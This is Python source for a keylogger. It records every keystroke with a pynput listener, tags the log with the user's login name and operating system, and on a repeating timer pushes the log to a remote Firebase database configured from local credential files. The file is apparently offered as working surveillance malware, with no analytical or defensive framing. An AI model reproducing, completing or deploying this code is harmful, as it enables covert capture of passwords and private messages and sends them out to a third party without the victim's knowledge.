#!/usr/bin/python
import subprocess
import threading
import firebase_admin
from firebase_admin import credentials
import pynput
from firebase_admin import db
from datetime import datetime
import os
import platform
from pathlib import Path
from termcolor import colored, cprint


class Keylogger:

    def __init__(self):

        self.keyStrokes = {}

        self.log = "Keylogger Started on " + " >> " + os.getlogin() + " >> " + platform.system()

        self.currentWord = self.log


        self.reportTime = int(self.timeFile())

        self.now = datetime.now()

        self.currentTime = str(self.now.strftime("%H:%M:%S"))

        self.downloads_path = str(Path.home() / "Downloads")

        self.start()

        # self.schedulerTest = sched.scheduler(time.time, time.sleep)
        #
        # self.schedulerTest.enter(10, 1, self.randomFunc, ('TestThis',))
        # self.schedulerTest.run()

    def dbUrl(self):
        with open("DBURL") as f:
            content = f.read()
            return content

    def timeFile(self):
        with open("TIME") as f:
            content = f.read()
            return content

    def initializeDatabase(self):
        try:
            cred = credentials.Certificate("DBJSON.json")
            firebase_admin.initialize_app(cred, {
                'databaseURL': self.dbUrl()
            })
            print("[+] Initialize Database Successful!")
        except Exception as e:
            pass


    def addDataToDatabase(self,key, value):
        reference = db.reference("/Keystrokes")
        self.keyStrokes[key] = value
        reference.push(self.keyStrokes)
        print("[+] Successful")

    def appendLog(self, string):
        self.log += string

    def keyPress(self, key):
        global log
        try:
            self.currentWord = str(key.char)
        except AttributeError:
            if key == key.space:
                self.currentWord = " "
            elif key == key.enter or key == key.backspace or key == key.tab:
                pass
            else:
                self.currentWord = " " + str(key) + " "
        self.appendLog(self.currentWord)

    def report(self):
        global log
        self.addDataToDatabase(self.currentTime, self.log)
        log = ""
        timer = threading.Timer(self.reportTime, self.report)
        timer.start()

    def randomFunc(self, test='default'):
        self.start()
        self.schedulerTest.enter(30, 1, self.randomFunc, ('',))



    def start(self):
        self.initializeDatabase()
        keyboardListener = pynput.keyboard.Listener(on_press=self.keyPress)
        with keyboardListener:
            self.report()
            keyboardListener.join()


